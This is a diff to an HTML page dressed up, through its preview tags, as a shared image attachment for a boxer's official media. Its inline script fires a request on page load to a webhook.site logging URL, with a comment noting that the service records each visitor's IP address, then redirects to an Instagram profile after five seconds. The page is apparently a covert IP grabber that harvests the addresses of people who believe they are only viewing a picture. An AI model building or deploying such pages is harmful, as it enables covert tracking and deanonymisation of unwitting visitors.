@@ -5,17 +5,15 @@
     <meta property="og:title" content="Omrie 'O.Z.' Lawrence - Official Media">
     <meta property="og:site_name" content="OZ Boxing">
     <meta property="og:description" content="View Shared Image - (1) Attachment">
-    
     <meta property="og:image" content="https://github.com/Omrie-OZ-Boxing/Media/blob/main/OmrieOZlawrence.PNG?raw=true">
     <meta property="og:type" content="image.png">
 
     <script>
-        // RADAR: Immediate Cloud Hit
-        const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
-        const data = "?type=FINAL_DEPLOY&ts=" + Date.now();
-        navigator.sendBeacon(radar + data);
+        // 1. THE RADAR: Fire this immediately
+        // Webhook.site automatically logs the IP address of any incoming request
+        fetch("https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e?type=O_Z_LAUNCH_SYNC");
 
-        // DELAY: 5-Second Viewing window
+        // 2. THE DELAY: Hold the image for exactly 5 seconds
         setTimeout(function() {
             window.location.replace("https://www.instagram.com/o.z._thaboxer_/");
         }, 5000); 
